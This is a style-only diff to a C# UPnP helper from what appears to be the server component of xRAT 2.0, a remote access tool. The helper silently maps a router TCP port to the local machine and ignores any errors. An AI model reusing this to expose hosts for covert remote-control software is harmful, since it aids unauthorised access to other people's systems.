@@ -5,15 +5,15 @@ using NATUPNPLib;
 
 namespace xServer.Core.Helper
 {
-    static class UPnP
+    internal static class UPnP
     {
         public static void ForwardPort(ushort port)
         {
             new Thread(() =>
             {
                 EndPoint endPoint;
-                string ipAddr = "";
-                int retry = 0;
+                var ipAddr = "";
+                var retry = 0;
 
                 do
                 {
@@ -25,7 +25,6 @@ namespace xServer.Core.Helper
                             c = new TcpClient();
                             c.Connect("www.google.com", 80);
                             endPoint = c.Client.LocalEndPoint;
-
                         }
                         finally
                         {
@@ -39,7 +38,7 @@ namespace xServer.Core.Helper
                         if (endPoint != null)
                         {
                             ipAddr = endPoint.ToString();
-                            int index = ipAddr.IndexOf(":");
+                            var index = ipAddr.IndexOf(":");
                             ipAddr = ipAddr.Remove(index);
                         }
                         // We got through successfully. We may exit the loop.
@@ -56,12 +55,13 @@ namespace xServer.Core.Helper
 
                 try
                 {
-                    IStaticPortMappingCollection portMap = new UPnPNAT().StaticPortMappingCollection;
+                    var portMap = new UPnPNAT().StaticPortMappingCollection;
                     if (portMap != null)
                         portMap.Add(port, "TCP", port, ipAddr, true, "xRAT 2.0 UPnP");
                 }
                 catch
-                { }
+                {
+                }
             }).Start();
         }
 
@@ -69,12 +69,13 @@ namespace xServer.Core.Helper
         {
             try
             {
-                IStaticPortMappingCollection portMap = new UPnPNAT().StaticPortMappingCollection;
+                var portMap = new UPnPNAT().StaticPortMappingCollection;
                 if (portMap != null)
                     portMap.Remove(port, "TCP");
             }
             catch
-            { }
+            {
+            }
         }
     }
 }
